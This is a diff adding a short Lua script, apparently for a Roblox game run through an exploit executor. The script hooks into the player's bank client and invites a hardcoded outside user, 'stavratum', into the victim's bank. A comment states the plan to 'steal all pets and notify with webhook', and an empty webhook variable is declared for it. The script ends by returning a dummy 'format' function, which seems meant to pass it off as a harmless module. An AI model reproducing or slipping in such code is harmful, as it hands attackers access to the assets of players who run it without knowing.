@@ -1,0 +1,29 @@
+local user = "stavratum"
+local webhook = ""
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local client = game:GetService("Players").LocalPlayer
+local bank = getsenv(client.PlayerScripts.Scripts.GUIs:FindFirstChild("Bank Client"))
+
+-- <void> bank.GetMyBanks
+-- <void> bank.GetBank
+-- <void> bank.Deposit
+-- <void> bank.InviteToBank
+-- <void> bank.KickMember
+-- <void> bank.LockPets
+
+-- local banks;
+-- bank.GetMyBanks()
+-- banks = getupvalue(bank.GetMyBanks, 0)
+-- for i,v in ipairs(banks) do
+--    bank.Deposit(v)
+-- end
+  
+-- umm steal all pets and notify with webhook blah i will do it later
+
+bank.InviteToBank(user) -- !hook v1.Message.New before call!
+
+--
+
+return { format = function() end }
